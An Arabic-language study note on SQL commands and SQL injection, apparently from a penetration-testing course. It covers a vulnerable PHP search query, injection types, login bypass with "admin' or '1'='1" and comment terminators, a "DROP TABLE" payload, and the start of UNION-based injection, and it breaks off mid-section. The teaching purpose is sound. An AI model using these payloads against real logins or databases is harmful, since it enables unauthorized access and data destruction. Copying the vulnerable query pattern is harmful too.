|---|---|---|---|
|1|admin|pass|2020|
|2|john|123|2020|

---

# FROM

يعني:

من جدول.

---

مثلاً:

```sql
SELECT *
FROM users;
```

هات البيانات من users.

---

# اختيار أعمدة معينة

مش لازم تجيب كل الأعمدة.

مثلاً:

```sql
SELECT username,password
FROM logins;
```

هيجيب:

|username|password|
|---|---|
|admin|pass|
|john|123|

---

ومش هيجيب:

- id
    
- date
    

---

وده أسرع.

وأحيانًا بيستخدم في SQL Injection.

---

# أول Query

```sql
SELECT *
FROM logins;
```

جاب كل الأعمدة.

---

# تاني Query

```sql
SELECT username,password
FROM logins;
```

جاب عمودين بس.

---

# DROP Statement

دي أخطر أوامر SQL.

---

DROP معناها:

احذف بالكامل.

---

## حذف جدول

```sql
DROP TABLE logins;
```

يعني:

امسح الجدول كله.

---

مش الصفوف.

لا.

الجدول نفسه.

---

قبل:

```
logins
```

بعد:

```
مش موجود أصلاً
```

---

# SHOW TABLES

بعد الحذف:

```sql
SHOW TABLES;
```

طلع:

```
Empty Set
```

يعني مفيش جداول.

---

# Permanent Delete

الشرح قال:

```
permanently
```

يعني حذف نهائي.

---

مش:

Recycle Bin

ولا:

Undo

ولا:

Ctrl+Z

خلص.

---

عشان كده لازم تستخدم DROP بحذر.

---

# ALTER Statement

ALTER معناها:

تعديل.

لكن تعديل على شكل الجدول نفسه.

مش البيانات.

---

مثلاً:

- تضيف عمود
    
- تمسح عمود
    
- تغير اسم عمود
    
- تغير نوع البيانات
    

---

# ADD

إضافة عمود جديد.

```sql
ALTER TABLE logins
ADD newColumn INT;
```

يعني:

ضيف عمود اسمه:

```
newColumn
```

نوعه رقم.

---

قبل:

|id|username|

بعد:

|id|username|newColumn|

---

# RENAME COLUMN

تغيير اسم العمود.

```sql
ALTER TABLE logins
RENAME COLUMN newColumn
TO newerColumn;
```

يعني:

غير الاسم.

---

قبل:

```
newColumn
```

بعد:

```
newerColumn
```

---

# MODIFY

لتغيير نوع البيانات.

```sql
ALTER TABLE logins
MODIFY newerColumn DATE;
```

يعني:

غير نوع العمود.

---

قبل:

```
INT
```

بعد:

```
DATE
```

---

# DROP Column

حذف عمود.

```sql
ALTER TABLE logins
DROP newerColumn;
```

يعني:

امسح العمود.

---

قبل:

|id|username|newerColumn|

بعد:

|id|username|

---

# Privileges

الشرح قال:

```
as long as we have enough privileges
```

يعني لازم يكون عندك صلاحيات.

---

لو أنت مستخدم عادي.

غالبًا مش هتعرف تعمل:

```
DROP
ALTER
CREATE
```

---

لكن ممكن تقدر تعمل:

```
SELECT
```

بس.

---

# UPDATE Statement

UPDATE معناها:

تعديل بيانات موجودة.

---

مش إضافة.

ولا حذف.

تعديل.

---

## الصيغة

```sql
UPDATE table
SET column=value
WHERE condition;
```

---

خلينا نفهمها.

---

### UPDATE

عدل.

---

### table

الجدول.

---

### SET

حدد القيمة الجديدة.

---

### WHERE

حدد هتعدل مين.

---

# مثال

```sql
UPDATE logins
SET password='change_password'
WHERE id>1;
```

يعني:

غير الباسورد.

وخليه:

```
change_password
```

لكن لمين؟

اللي:

```
id > 1
```

---

لو الجدول:

|id|username|password|
|---|---|---|
|1|admin|123|
|2|john|abc|
|3|tom|xyz|
|4|ali|000|

---

بعد التنفيذ:

|id|username|password|
|---|---|---|
|1|admin|123|
|2|john|change_password|
|3|tom|change_password|
|4|ali|change_password|

---

لاحظ إن id=1 متغيرش.

لأن الشرط:

```
id > 1
```

---

# WHERE

دي من أهم الكلمات في SQL.

هي اللي بتحدد هتشتغل على أنهي صفوف.

---

لو نسيتها:

```sql
UPDATE logins
SET password='123';
```

هيغير الباسورد لكل المستخدمين.

وده خطأ مشهور جدًا.

---

# الفرق بين الأوامر اللي اتعلمناها

|الأمر|وظيفته|
|---|---|
|CREATE|إنشاء Database أو Table جديد|
|INSERT|إضافة صف جديد|
|SELECT|قراءة البيانات|
|UPDATE|تعديل البيانات|
|ALTER|تعديل هيكل الجدول (إضافة أو حذف أعمدة أو تغيير نوعها)|
|DROP|حذف جدول أو Database بالكامل|

## معلومة مهمة للبنتستنج

في SQL Injection، أكتر أمر هتشوفه في البداية هو:

```sql
SELECT
```

لأن هدف المهاجم غالبًا بيكون **قراءة البيانات** من قاعدة البيانات، زي أسماء المستخدمين أو الإيميلات أو الـ Hashes الخاصة بكلمات المرور. بعد كده، لو الثغرة والصلاحيات تسمح، ممكن يستغل أوامر تانية زي `UPDATE` أو `INSERT` أو حتى `DROP`، لكن ده بيعتمد على صلاحيات حساب قاعدة البيانات اللي التطبيق شغال بيه.

-------
# Layer 4
# Use of SQL in Web Applications

يعني:

**إزاي مواقع الويب بتستخدم SQL وقواعد البيانات.**

أي موقع فيه بيانات تقريبًا بيحتاج قاعدة بيانات.

زي:

- تسجيل الدخول
    
- البحث
    
- التعليقات
    
- المنتجات
    
- الطلبات
    
- الرسائل
    

كل ده بيتخزن في Database.

---

# السيناريو الطبيعي

لما المستخدم يعمل Request للموقع.

مثلاً:

```
ابحث عن المستخدم: mohab
```

الموقع ميعرفش البيانات دي.

فيروح للداتابيز يسألها.

ويرجع النتيجة للمستخدم.

يعني المسار كده:

```
User
   |
   |
Website (PHP)
   |
   |
MySQL Database
   |
   |
يرجع النتيجة
```

---

# مثال PHP

الكود:

```php
$conn = new mysqli("localhost", "root", "password", "users");
```

خلينا نفهمه سطر سطر.

---

## new mysqli

دي دالة بتعمل اتصال بقاعدة البيانات.

يعني:

```
Connect Database
```

---

## localhost

يعني قاعدة البيانات موجودة على نفس السيرفر.

يعني:

```
127.0.0.1
```

---

## root

اسم المستخدم اللي هيدخل على قاعدة البيانات.

---

## password

الباسورد بتاع المستخدم ده.

---

## users

اسم قاعدة البيانات.

---

يعني السطر كله معناه:

"اتصل بقاعدة بيانات اسمها users باستخدام اليوزر root والباسورد password."

---

# السطر التاني

```php
$query = "select * from logins";
```

ده مجرد String.

بيخزن جواه الاستعلام.

يعني:

```
SELECT * FROM logins
```

---

# السطر التالت

```php
$result = $conn->query($query);
```

هنا الموقع بعت الـ Query للداتابيز.

والداتابيز نفذته.

ورجع النتيجة.

وخزنها في:

```
$result
```

---

# طيب النتيجة دي نعمل بيها إيه؟

السطر ده:

```php
while($row = $result->fetch_assoc()){
    echo $row["name"]."<br>";
}
```

---

## while

يعني:

لف على كل الصفوف.

---

## fetch_assoc()

هات صف واحد.

في شكل:

```
Key => Value
```

مثلاً:

```
name => Mohab
age => 21
```

---

## echo

اطبع على الصفحة.

---

اعمل سطر جديد.

---

يعني لو الداتابيز فيها:

|name|
|---|
|Mohab|
|Ali|
|Ahmed|

هيطبع:

```
Mohab
Ali
Ahmed
```

---

# استخدام Input المستخدم

المواقع مش بتعرض كل البيانات دائمًا.

أحيانًا بتستخدم Input المستخدم.

زي البحث.

---

مثلاً:

```
Search:

Mohab
```

الموقع ياخد الكلمة دي.

ويبحث عنها.

---

الكود:

```php
$searchInput = $_POST['findUser'];
```

---

## $_POST

يعني البيانات اللي المستخدم بعتها.

---

## findUser

اسم الـ Input الموجود في الفورم.

---

لو المستخدم كتب:

```
admin
```

يبقى:

```
$searchInput = admin
```

---

# السطر المهم

```php
$query = "select * from logins where username like '%$searchInput'";
```

وده أخطر سطر في الشرح كله.

لازم نفهمه كويس.

---

## LIKE

بدل ما يعمل مقارنة حرفية.

بيعمل بحث مشابه.

زي:

```
contains
```

---

## %

في SQL معناها Wildcard.

يعني:

أي عدد من الحروف.

---

مثلاً:

```
%admin%
```

يعني:

أي كلمة فيها admin.

زي:

```
admin
superadmin
admin123
myadmin
```

---

# لو المستخدم كتب:

```
admin
```

يبقى الـ Query:

```sql
SELECT *
FROM logins
WHERE username LIKE '%admin';
```

فيبحث عن أي اسم مستخدم ينتهي بـ admin.

---

# لحد هنا كله طبيعي.

فين المشكلة؟

---

# المشكلة هنا

الموقع خد Input المستخدم.

وحطه داخل SQL Query مباشرة.

بدون حماية.

وده سبب SQL Injection.

---

# What is Sanitization

الشرح قال:

Sanitization

يعني:

تنظيف البيانات.

---

يعني لو المستخدم كتب:

```
'
```

الموقع يشيله.

أو يعمله Escape.

---

ولو كتب:

```
--
```

يشيله.

---

ولو كتب:

```
;
```

يشيله.

---

يعني يمنع أي رموز خطيرة.

---

# ليه؟

علشان المستخدم ميحولش البيانات إلى أوامر SQL.

---

# What is Injection

يعني إيه Injection؟

ببساطة:

إن البرنامج يفهم كلام المستخدم على إنه كود.

بدل ما يفهمه على إنه بيانات.

---

مثال بسيط.

الموقع متوقع:

```
Mohab
```

لكن المستخدم كتب:

```
SQL Code
```

والموقع نفذه.

دي اسمها Injection.

---

# Misinterprets User Input

الجملة دي معناها:

الموقع فهم Input المستخدم غلط.

بدل ما يعتبره String.

اعتبره Code.

---

# Escaping User Input Bounds

دي من أهم الجمل.

يعني:

الخروج من حدود النص.

---

مثلاً:

الموقع عامل:

```sql
username='%INPUT'
```

المستخدم كتب:

```
admin
```

تبقى:

```sql
username='admin'
```

تمام.

---

لكن لو كتب:

```
admin'
```

تبقى:

```sql
username='admin''
```

هو كده خرج من حدود الـ String.

وبقى يقدر يكتب SQL.

---

وده أساس SQL Injection.

---

# SQL Injection

بتحصل لما:

Input المستخدم يدخل جوه Query بدون حماية.

---

الكود:

```php
$query = "select * from logins where username like '%$searchInput'";
```

ده Vulnerable.

لأنه حط Input المستخدم كما هو.

---

# لو المستخدم كتب

```
admin
```

هيبقى:

```sql
select * from logins
where username like '%admin'
```

وهيشتغل طبيعي.

---

# لو كتب

```
SHOW DATABASES;
```

هيبقى:

```sql
LIKE '%SHOW DATABASES;'
```

هيعتبرها كلمة بحث.

مش أمر.

---

# ليه؟

لأنها لسه جوه الـ Quotes.

---

# لكن لو أضفنا Single Quote

```
'
```

يبقى خرجنا من النص.

وده أخطر حاجة.

---

الشرح جاب مثال:

```
1'; DROP TABLE users;
```

خلينا نشوف حصل إيه.

---

Input:

```
1'; DROP TABLE users;
```

---

الموقع عمل:

```sql
SELECT *
FROM logins
WHERE username LIKE '%1'; DROP TABLE users;'
```

لاحظ.

الـ '

قفلت الـ String.

---

بعدها بقى عندنا:

```sql
DROP TABLE users;
```

وده SQL Command حقيقي.

---

وبالتالي ينفذ.

---

# Escape Bounds

يعني خرج من حدود:

```
'%INPUT'
```

وبدأ يكتب أوامر جديدة.

---

# ليه المثال ده مش شغال في MySQL؟

الشرح قال:

```
For simplicity
```

يعني للتوضيح فقط.

---

لأن MySQL افتراضيًا مش بيسمح بأكتر من Query في نفس السطر بالطريقة دي.

لكن:

- MSSQL
    
- PostgreSQL
    

يسمحوا بده.

---

أما MySQL فله طرق تانية هيتكلم عنها بعدين.

---

# Syntax Error

يعني خطأ في كتابة SQL.

---

الخطأ:

```
near "'"
```

يعني فيه Quote زيادة.

---

الاستعلام:

```sql
SELECT *
FROM logins
WHERE username LIKE '%1';
DROP TABLE users;'
```

في آخره:

```
'
```

زيادة.

فـ SQL متعرفش تفسره.

---

# Trailing Character

يعني حرف متبقي في الآخر.

مالوش لازمة.

وبيكسر الـ Syntax.

---

# ليه المهاجم لازم يخلي الـ Query سليمة؟

لأن لو فيها Error.

مش هتتنفذ.

---

يعني لازم بعد الحقن.

يبقى شكل الـ Query النهائي صحيح.

---

# طب إزاي يعرف شكل الـ Query؟

غالبًا ميعرفوش.

لأنه مش شايف الكود.

---

عشان كده بيستخدم Techniques مختلفة.

زي:

- Comments
    
- Quotes
    
- Union
    

علشان يصلح الـ Query.

---

# Types of SQL Injection

أنواع SQL Injection.

---

بتتقسم حسب:

إزاي بنشوف النتيجة.

---

# 1- In-band SQL Injection

أسهل نوع.

النتيجة بترجع على الصفحة مباشرة.

---

مثلاً:

أنت عملت Injection.

الموقع عرضلك أسماء المستخدمين.

خلاص.

دي In-band.

---

## Union Based

بيعتمد على UNION.

وبيجيب بيانات من جداول تانية.

ويعرضها في الصفحة.

وده أشهر نوع وهتدرسه في الكورس.

---

## Error Based

بيعتمد على رسائل الخطأ.

المهاجم يعمل استعلام يسبب Error.

ورسالة الخطأ نفسها تحتوي على معلومات من قاعدة البيانات.

---

# 2- Blind SQL Injection

أصعب شوية.

---

الموقع مش بيرجع البيانات.

لكن تقدر تعرفها بطريقة غير مباشرة.

---

مثلاً:

تسأل سؤال.

لو True الصفحة تختلف.

لو False الصفحة تختلف.

---

وتستخرج البيانات حرف حرف.

---

## Boolean Based

بيعتمد على:

True

False

---

مثلاً:

لو أول حرف من اسم الداتابيز = A

اعرض الصفحة.

لو لأ

اعرض Error.

---

ومن هنا تعرف الحروف واحدة واحدة.

---

## Time Based

بيعتمد على الوقت.

---

لو الشرط صح.

خلي الصفحة تستنى 5 ثواني.

---

لو غلط.

ترجع فورًا.

---

ومن فرق الوقت تعرف الإجابة.

---

# Sleep()

دي دالة تخلي SQL تستنى.

مثلاً:

```sql
SLEEP(5)
```

يعني:

استنى 5 ثواني.

---

# 3- Out-of-band SQL Injection

أندر نوع.

---

لما متقدرش تشوف النتيجة نهائي.

---

فتخلي الداتابيز تبعتها لسيرفر تاني.

مثلاً عن طريق:

- DNS
    
- HTTP
    

وبعدين تروح تشوفها هناك.

---

# ملخص الأنواع

|النوع|الفكرة|
|---|---|
|In-band|البيانات بتظهر مباشرة|
|Union Based|استخدام UNION لإظهار البيانات|
|Error Based|استغلال رسائل الخطأ|
|Blind|استنتاج البيانات بدون ظهورها|
|Boolean Based|True / False|
|Time Based|الاعتماد على فرق الوقت|
|Out-of-band|إرسال البيانات لسيرفر خارجي|

## أهم فكرة لازم تثبتها

سبب ثغرة **SQL Injection** هو إن التطبيق بياخد مدخلات المستخدم ويحطها داخل استعلام SQL **بدون Sanitization أو Validation مناسبين**، فبدل ما قاعدة البيانات تعتبرها بيانات عادية، ممكن تعتبرها جزءًا من الاستعلام نفسه، وده يغير سلوك الـ Query ويؤدي إلى تنفيذ أوامر غير مقصودة إذا كان التطبيق مكتوب بطريقة غير آمنة.

# Layer 5
الجزء ده من أهم أجزاء SQL Injection، لأنه بيشرح فكرة اسمها **Subverting Query Logic** يعني:

> **التلاعب بمنطق الاستعلام (Query) بحيث يخدم هدف المهاجم بدل ما يخدم هدف البرنامج.**

وده غالبًا بيستخدم في **تخطي تسجيل الدخول (Authentication Bypass)**.


---

# Subverting Query Logic

خلينا نفتكر الأول إن الموقع لما حد يعمل Login بيبعت Query للداتابيز.

مثلاً لو كتبت:

```
Username: admin
Password: p@ssw0rd
```

الموقع هيبني Query زي دي:

```sql
SELECT * FROM logins
WHERE username='admin'
AND password='p@ssw0rd';
```

---

## يعني إيه Query دي؟

بتقول للداتابيز:

"هاتلي أي صف من جدول logins يكون:

- الـ username = admin
    
- والـ password = p@ssw0rd"
    

لو لقت صف مطابق، يبقى تسجيل الدخول صح.

لو ملقتش، يبقى Login Failed.

---

# Authentication Bypass

يعني:

**تخطي تسجيل الدخول بدون معرفة الباسورد الحقيقي.**

وده بيحصل عن طريق تغيير منطق الـ Query نفسها.

---

# مثال صحيح

لو قاعدة البيانات فيها:

|username|password|
|---|---|
|admin|p@ssw0rd|

وجيت كتبت:

```
Username: admin
Password: p@ssw0rd
```

فالـ Query:

```sql
SELECT * FROM logins
WHERE username='admin'
AND password='p@ssw0rd';
```

هترجع الصف ده.

فيتم تسجيل الدخول.

---

# مثال غلط

لو كتبت:

```
Username: admin
Password: admin
```

يبقى:

```sql
SELECT * FROM logins
WHERE username='admin'
AND password='admin';
```

الداتابيز هتدور.

مش هتلاقي Password اسمه admin.

فترجع صفر نتائج.

ويظهر:

```
Login Failed
```

---

# SQLi Discovery

قبل ما المهاجم يستغل الثغرة، لازم يعرف:

**هل الصفحة أصلًا Vulnerable لـ SQL Injection ولا لأ؟**

إزاي؟

بيجرب يدخل رموز خاصة.

زي:

```
'
"
#
;
)
```

---

الرموز دي اسمها:

```
Special Characters
```

لأنها ليها معنى في SQL.
![[Pasted image 20260618172731.png]]

---

# URL Encoding

الشرح كتب:

|Payload|Encoded|
|---|---|
|'|%27|
|"|%22|
|#|%23|
|;|%3B|

---

يعني لو الـ Input بيتبعت في URL.

بدل:

```
'
```

يبقى:

```
%27
```

وده اسمه:

```
URL Encoding
```

يعني تحويل الرموز الخاصة لصيغة مناسبة للـ URL.

---

# تجربة أول Payload

نفترض كتبنا في Username:

```
'
```

بس.

---

فالـ Query هتبقى:

```sql
SELECT *
FROM logins
WHERE username=''''
AND password='something';
```

لاحظ عدد الـ Quotes.

```
''''
```

بقى فيه Quote زيادة.

---

وده يخلي SQL متفهمش الجملة.

فتطلع:

```
SQL Syntax Error
```

---

# ليه ظهور Error مهم؟

لأنه بيقول للمهاجم:

"الموقع بياخد الـ Input ويحطه جوه SQL Query."

وده مؤشر إن فيه احتمال وجود SQL Injection.

---

# طيب لو حصل Error؟

لازم المهاجم يخلي الـ Query سليمة.

يعني بعد التعديل تفضل SQL Syntax صحيحة.

وده بيتعمل بطرق مختلفة، زي استخدام التعليقات (Comments) أو موازنة علامات الاقتباس.

---

# OR Injection

دي أشهر فكرة في SQL Injection.

بتعتمد على كلمة:

```sql
OR
```

---

OR معناها:

"أو"

---

مثال:

```
أنا هروح البحر
أو
هروح السينما
```

لو واحدة منهم صح يبقى الجملة صح.

---

في SQL نفس الفكرة.

```
True OR False = True

True OR True = True

False OR True = True

False OR False = False
```

---

# AND

أما AND:

لازم الاتنين يبقوا True.

```
True AND True = True

True AND False = False

False AND True = False

False AND False = False
```

---

# أولوية التنفيذ

الشرح قال:

```
AND evaluated before OR
```

يعني SQL بتنفس AND الأول.

وبعدين OR.

---

زي الرياضيات:

```
2 + 3 × 5
```

الضرب الأول.

وبعدين الجمع.

---

نفس الفكرة هنا.

---

# الشرط اللي بيرجع True دائمًا

في SQL:

```sql
'1'='1'
```

هل 1 بيساوي 1؟

آه.

يبقى النتيجة:

```
TRUE
```

ودائمًا True.

---

وده بيتسمى:

```
Always True Condition
```

---

# المثال اللي في الشرح

الـ Input كان:

```
admin' or '1'='1
```

لاحظ:

بعد admin فيه:

```
'
```

علشان يقفل الـ String.

وبعدين يبدأ يكتب SQL.

---

فالـ Query بقت:

```sql
SELECT *
FROM logins
WHERE username='admin'
OR '1'='1'
AND password='something';
```

---

خلينا نفهمها.

الجزء الأول:

```
username='admin'
```

لو فيه Admin.

يبقى True.

---

الجزء التاني:

```
'1'='1'
```

دايمًا True.

---

الجزء التالت:

```
password='something'
```

غالبًا False.

---

لكن بسبب ترتيب التنفيذ:

```
AND الأول
```

يبقى:

```
True AND False
```

=

```
False
```

---

بعدها:

```
username='admin'
OR False
```

لو admin موجود.

تبقى:

```
True OR False
```

=

```
True
```

---

فتتم عملية تسجيل الدخول.

---

# ليه نجح؟

مش لأنه عرف الباسورد.

لكن لأنه غيّر منطق الـ Query.

وده معنى:

```
Subverting Query Logic
```

أي تغيير منطق الاستعلام الأصلي.

---

# طب لو Username غلط؟

نفترض كتب:

```
notAdmin
```

فالـ Query:

```sql
WHERE username='notAdmin'
OR ...
```

لو المستخدم مش موجود.

يبقى:

```
False
```

---

ويبقى:

```
False OR False
```

=

```
False
```

فيسقط تسجيل الدخول.

---

# ليه الثغرة دي خطيرة؟

لأن المطور كان متوقع إن المستخدم يدخل:

```
admin
```

لكن المستخدم دخل حاجة غيرت شكل الـ SQL نفسها.

فبدل ما قاعدة البيانات تنفذ بحث عادي، نفذت استعلام بمنطق مختلف.

---

# الخلاصة

- الموقع بيبني Query باستخدام بيانات المستخدم.
    
- لو البيانات دي دخلت من غير حماية (Sanitization أو استخدام Prepared Statements)، ممكن تغير منطق الـ Query.
    
- معاملات زي **AND** و **OR** بتحدد نتيجة الشرط، واستغلالها بشكل غير آمن ممكن يؤدي إلى تخطي تسجيل الدخول في تطبيقات مكتوبة بطريقة ضعيفة.
    
- السبب الحقيقي للمشكلة هو **دمج مدخلات المستخدم داخل SQL مباشرة** بدل استخدام طرق آمنة للتعامل مع الاستعلامات.





-----
# Layer 6
الجزء ده مهم جدًا، لكنه بيتكلم عن **فكرة عامة في SQL وهي الـ Comments**، وبعدين بيشرح إزاي كانت بتتستغل تاريخيًا في ثغرات SQL Injection. هشرحه من ناحية **فهم SQL وفهم سبب الثغرة**، من غير تفاصيل تشغيلية لاستغلالها.

---

# Using Comments

العنوان معناه:

**استخدام التعليقات (Comments) في SQL.**

زي أي لغة برمجة، SQL فيها تعليقات.

يعني جزء من الكود بيتكتب للمبرمج، لكن الـ Database بتتجاهله ومتنفذوش.

---

# Comments

يعني:

تعليقات.

زي في C++:

```cpp
// This is a comment
```

أو:

```cpp
/* Comment */
```

الكومبايلر بيتجاهلهم.

---

في SQL نفس الفكرة.

ممكن تكتب تعليق، والداتابيز هتعتبر اللي بعده مجرد ملاحظة مش أمر SQL.

---

# أنواع الـ Comments في MySQL

الشرح قال إن فيه 3 أنواع:

```
--
#

/**/
```

---

## النوع الأول

```
--
```

وده أشهر نوع.

مثال:

```sql
SELECT username FROM logins;
-- Select usernames
```

السطر الأول هيتنفذ.

السطر التاني مجرد تعليق.

---

# ليه اسمه Comment؟

لأنه مكتوب علشان الإنسان يقراه.

مش علشان قاعدة البيانات تنفذه.

---

# ملاحظة مهمة جدًا

في MySQL:

```
--
```

لوحدها مش كفاية.

لازم بعدها Space.

يعني:

```
-- 
```

وليس:

```
--
abc
```

---

يعني لازم يبقى فيه:

```
-
-
Space
```

---

وده سبب إن ناس كتير بتكتب:

```
-- -
```

علشان تضمن وجود المسافة.

---

# URL Encoding

لما الـ Payload يبقى في URL.

المسافة بتتحول لـ:

```
+
```

فممكن تشوف:

```
--+
```

يعني:

```
-- Space
```

---

# النوع التاني

```
#
```

برضو بيعمل Comment.

---

مثال:

```sql
SELECT *
FROM logins
WHERE username='admin';
# comment
```

أي حاجة بعد # بتتجاهلها قاعدة البيانات.

---

# ليه ده مهم؟

لأن المبرمج ممكن يكتب:

```sql
SELECT *
FROM users;
# testing
```

وقاعدة البيانات هتنفذ:

```sql
SELECT *
FROM users;
```

بس.

---

# مشكلة الـ

في المتصفح.

الـ Browser بيعتبر:

```
#
```

بداية Fragment.

يعني مش بيبعته للسيرفر أصلًا.

---

مثلاً:

```
example.com/page#test
```

اللي هيوصل للسيرفر هو:

```
example.com/page
```

بس.

---

علشان كده لو محتاج تبعت # داخل URL لازم يتحول لـ URL Encoding:

```
%23
```

---

# The server will ignore

الجملة دي معناها:

السيرفر هيتجاهل الجزء اللي بعد الـ Comment.

---

مثلاً:

```sql
SELECT *
FROM users
# Hello
```

الداتابيز هتشوف:

```sql
SELECT *
FROM users
```

بس.

---

# مثال فيه Password

الشرح كاتب:

```sql
SELECT *
FROM logins
WHERE username='admin';
# anything here
AND password='something'
```

لأن فيه Comment.

فالجزء:

```
AND password='something'
```

مش هيتنفذ.

---

يعني الداتابيز هتنفذ أول جزء فقط.

---

# ليه بنتعلم الـ Comments؟

علشان نفهم إزاي كتابة التعليقات بتأثر على الـ Query.

وليه المطور لازم يستخدم حماية مناسبة لما يبني استعلامات SQL من مدخلات المستخدم.

---

# Another Example

بعدها الشرح دخل في مثال جديد.

---

الـ Query:

```sql
SELECT *
FROM logins
WHERE
(username='admin'
AND id>1)
AND password='hash'
```

خلينا نفهمها.

---

## فيه Parentheses

يعني أقواس.

```
(
)
```

---

زي الرياضيات.

```
(5+2)*3
```

الأقواس بتتنفذ الأول.

---

في SQL برضو.

أي شرط داخل الأقواس بيتحسب الأول.

---

# الشرط الأول

```
username='admin'
```

هل اليوزر اسمه admin؟

---

# الشرط التاني

```
id>1
```

هل الـ ID أكبر من 1؟

---

الاتنين مربوطين بـ:

```
AND
```

يعني لازم الاتنين يبقوا صح.

---

# المشكلة

الشرح بيقول:

الـ Admin رقمه:

```
id=1
```

---

يبقى الشرط:

```
id>1
```

هيكون:

```
False
```

---

حتى لو Username صح.

هيبقى:

```
True AND False
```

=

```
False
```

---

وبالتالي Login يفشل.

---

# Password Hash

لاحظ إن الباسورد هنا:

```
437b930...
```

مش نص عادي.

---

ده اسمه:

```
Hash
```

---

يعني الباسورد اتحول لقيمة ثابتة.

زي:

```
password123
```

تبقى:

```
482c811da5...
```

---

وده معناه إن التطبيق مش بيقارن الباسورد كنص.

بيعمل Hash الأول.

ثم يقارن.

---

وده أفضل من تخزين الباسورد كنص عادي.

---

# تجربة Login

لو كتبت:

```
admin
p@ssw0rd
```

هيتحول الباسورد لـ Hash.

لكن شرط:

```
id>1
```

هيفضل غلط.

فيسقط Login.

---

# تجربة User تاني

لو User اسمه:

```
tom
```

ورقمه:

```
id=2
```

يبقى:

```
username='tom'
```

=

True

و

```
id>1
```

=

True

---

يبقى:

```
True AND True
```

=

True

---

فيتم تسجيل الدخول.

---

# فكرة الأقواس

اللي لازم يثبت في دماغك هي:

وجود الأقواس بيغير ترتيب تنفيذ الشروط.

---

مثلاً:

```
A OR B AND C
```

غير:

```
(A OR B) AND C
```

---

عشان الأقواس ليها أولوية.

---

# ملخص الجزء كله

- الـ **Comments** في SQL وسيلة لكتابة ملاحظات، وقاعدة البيانات بتتجاهل أي حاجة بعدها.
    
- أشهر أنواع التعليقات في MySQL هي:
    
    - `--` (لازم بعدها مسافة)
        
    - `#`
        
    - `/* ... */`
        
- الأقواس `()` في SQL بتحدد ترتيب تنفيذ الشروط، وبتتنفذ قبل العمليات اللي براها.
    
- استخدام الـ Hash لكلمات المرور أفضل من تخزينها كنص عادي، لأنه بيحسن أمان قاعدة البيانات.
    
- أهم درس أمني من الجزء ده هو إن المطور مينفعش يبني استعلامات SQL عن طريق دمج مدخلات المستخدم مباشرة، لأن ده ممكن يغير منطق الاستعلام ويؤدي لثغرات SQL Injection لو مفيش حماية مناسبة
# Layer 7
الجزء ده يعتبر بداية نوع جديد من أنواع SQL Injection اسمه **Union-Based SQL Injection**.

---

# Union Clause

لحد دلوقتي كنا بنتكلم عن إن المهاجم يغير منطق الـ Query باستخدام OR أو Comments.

لكن فيه طريقة تانية اسمها:

```text
UNION
```

ودي مش بتغير المنطق بس، لكن بتسمح **بدمج نتائج أكثر من SELECT مع بعض**.

---

# يعني إيه UNION؟

كلمة UNION معناها:

**اتحاد أو دمج.**

في SQL وظيفتها إنها تجمع نتائج أكتر من استعلام SELECT في نتيجة واحدة.

---

مثال بسيط:

عندنا جدول اسمه:

```
ports
```

فيه:

|code|city|
|---|---|
|CN SHA|Shanghai|
|SG SIN|Singapore|
|ZZ-21|Shenzhen|

---

وعندنا جدول تاني:

```
ships
```

|Ship|city|
|---|---|
|Morrison|New York|

---

لو عملنا:

```sql
SELECT * FROM ports;
```

النتيجة:

|code|city|
|---|---|
|CN SHA|Shanghai|
|SG SIN|Singapore|
|ZZ-21|Shenzhen|

---

ولو عملنا:

```sql
SELECT * FROM ships;
```

النتيجة:

|Ship|city|
|---|---|
|Morrison|New York|

---

# استخدام UNION

لما نكتب:

```sql
SELECT * FROM ports
UNION
SELECT * FROM ships;
```

النتيجة هتبقى:

|code|city|
|---|---|
|CN SHA|Shanghai|
|SG SIN|Singapore|
|Morrison|New York|
|ZZ-21|Shenzhen|

---

يعني SQL خدت نتيجة أول SELECT.

وضافت عليها نتيجة تاني SELECT.

وعرضتهم كأنهم جدول واحد.

وده بالظبط دور UNION.

---

# ليه UNION مفيدة؟

في البرمجة العادية، ممكن يكون عندك بيانات في أكتر من جدول.

وبدل ما تعمل استعلامين منفصلين، تعمل UNION وتجيبهم مرة واحدة.

---

# شرط مهم جدًا

الشرح كتب:

> The data types of the selected columns should be the same.

يعني:

أنواع الأعمدة لازم تكون متوافقة.

---

مثلاً:

الاستعلام الأول بيرجع:

```
String
String
```

والتاني بيرجع:

```
String
String
```

تمام.

---

لكن لو الأول بيرجع:

```
String
```

والتاني بيرجع:

```
String
Integer
```

هيحصل Error.

---

# Even Columns

دي من أهم قواعد UNION.

لازم عدد الأعمدة في SELECT الأول يساوي عدد الأعمدة في SELECT التاني.

---

مثال:

```sql
SELECT city FROM ports
```

بيرجع:

```
Column واحدة
```

---

بينما:

```sql
SELECT * FROM ships
```

بيرجع:

```
Ship
City
```

يعني عمودين.

---

يبقى:

```
1 Column

UNION

2 Columns
```

مستحيل.

---

فتطلع الرسالة:

```text
The used SELECT statements have a different number of columns
```

يعني:

الاستعلامين عدد أعمدتهم مختلف.

---

# ليه لازم العدد يبقى متساوي؟

لأن SQL بتحاول تركب الصفوف فوق بعض.

مثلاً:

```
Name
Age
```

وتحط تحتها:

```
Mohab
22
```

تمام.

---

لكن مينفعش تحط:

```
Mohab
```

بس.

لأن العمود التاني ناقص.

---

# مثال المنتجات

الشرح افترض Query:

```sql
SELECT *
FROM products
WHERE product_id='1'
```

يعني:

هات المنتج اللي رقمه 1.

---

نفترض جدول products فيه عمودين:

```
Name
Price
```

---

فأي SELECT هتستخدم UNION معاه لازم ترجع برضو عمودين.

---

# المشكلة

نفترض إن جدول تاني اسمه:

```
passwords
```

وفيه:

```
username
password
```

---

يبقى:

```
products

=
2 Columns

passwords

=
2 Columns
```

ينفع UNION.

---

لكن لو الجدول التاني فيه 4 أعمدة.

يبقى مش هينفع.

---

# Un-even Columns

ودي مشكلة بتحصل كتير.

يعني عدد الأعمدة مش متساوي.

---

الشرح قال:

لو محتاج عمود واحد بس.

يبقى تحط بيانات وهمية في الأعمدة الباقية.

---

مثلاً عندك:

```
username
```

بس.

لكن لازم ترجع عمودين.

فتضيف قيمة ثابتة.

زي:

```
2
```

فتبقى:

```
username

2
```

---

ليه؟

علشان يبقى عدد الأعمدة:

```
2
```

---

# Junk Data

يعني:

بيانات مالهاش قيمة.

مجرد حشو.

---

زي:

```
1
2
3
4
```

---

أو:

```
abc
xyz
test
```

---

الغرض منها بس إن عدد الأعمدة يبقى صحيح.

---

# مثال

لو الجدول الأصلي فيه:

```
4 Columns
```

يبقى أي SELECT لازم يرجع 4 أعمدة.

---

فيحط:

```
username

